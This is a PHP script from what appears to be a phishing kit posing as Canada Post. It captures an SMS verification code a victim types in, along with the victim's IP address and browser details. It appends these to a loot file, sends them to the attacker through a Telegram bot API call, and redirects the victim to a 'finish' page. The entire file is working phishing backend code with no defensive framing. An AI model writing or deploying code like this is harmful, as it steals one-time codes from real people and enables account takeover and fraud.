<?php
$zabi = getenv("REMOTE_ADDR");
$msg .= "--++-----[ Poste Canada EN SMS]-----++--\n";
$msg .= "-------------- BY  ht-----\n";
$msg .= "SMS : ".$_POST['sms']."\n";
$msg .= "-------------- IP Infos ------------\n";
$msg .= "IP       : $zabi\n";
$msg .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$msg .= "----------------------By  ht ----------------------\n";

$text = fopen('../rzlt.txt', 'a');
fwrite($text, $msg);

include '../../config.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: ../finish.html");
?>